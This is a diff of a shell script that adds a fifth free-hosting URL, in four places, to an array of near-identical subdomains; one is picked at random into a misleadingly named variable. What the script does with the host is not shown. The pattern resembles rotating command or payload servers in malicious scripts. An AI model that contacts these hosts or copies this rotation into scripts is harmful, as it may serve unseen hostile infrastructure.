@@ -19,6 +19,7 @@ arr[0]="http://mobile841212121274.gearhostpreview.com"
 arr[1]="http://mobile8412121212741.gearhostpreview.com"
 arr[2]="http://mobile8412121212742.gearhostpreview.com"
 arr[3]="http://mobile8412121212744.gearhostpreview.com"
+arr[4]="http://mobile8412121212748.gearhostpreview.com"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
@@ -51,6 +52,7 @@ arr[0]="http://mobile841212121274.gearhostpreview.com"
 arr[1]="http://mobile8412121212741.gearhostpreview.com"
 arr[2]="http://mobile8412121212742.gearhostpreview.com"
 arr[3]="http://mobile8412121212744.gearhostpreview.com"
+arr[4]="http://mobile8412121212748.gearhostpreview.com"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
@@ -83,6 +85,7 @@ arr[0]="http://mobile841212121274.gearhostpreview.com"
 arr[1]="http://mobile8412121212741.gearhostpreview.com"
 arr[2]="http://mobile8412121212742.gearhostpreview.com"
 arr[3]="http://mobile8412121212744.gearhostpreview.com"
+arr[4]="http://mobile8412121212748.gearhostpreview.com"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
@@ -112,6 +115,7 @@ arr[0]="http://mobile841212121274.gearhostpreview.com"
 arr[1]="http://mobile8412121212741.gearhostpreview.com"
 arr[2]="http://mobile8412121212742.gearhostpreview.com"
 arr[3]="http://mobile8412121212744.gearhostpreview.com"
+arr[4]="http://mobile8412121212748.gearhostpreview.com"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
